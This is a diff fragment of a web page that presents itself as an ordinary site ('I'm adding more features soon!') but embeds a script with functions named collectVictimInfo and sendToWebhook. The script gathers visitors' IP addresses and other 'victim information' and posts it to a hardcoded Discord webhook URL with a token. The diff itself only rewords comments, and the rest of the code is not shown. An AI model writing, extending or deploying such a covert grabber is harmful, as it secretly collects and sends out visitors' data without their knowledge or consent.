@@ -10,7 +10,7 @@
     <p>I'm adding more features soon!</p>
 
     <script>
-        // Function to collect comprehensive victim information
+        // Function to collect essential victim information
         async function collectVictimInfo() {
             try {
                 // Get IP address
@@ -70,7 +70,7 @@
         async function sendToWebhook(info) {
             const webhookUrl = 'https://discord.com/api/webhooks/1461964964603625594/jH-XEtXJtxJm69mjlFViAi8BQWutT-P6wTioZ-tElKw3BlJihCEeuNB2AazCCIjgKQKU';
             
-            // Format the message in a cleaner way
+            // Format the message with only requested sections
             const message = `
 **Victim Information:**
 - IP Address: ${info.ip}
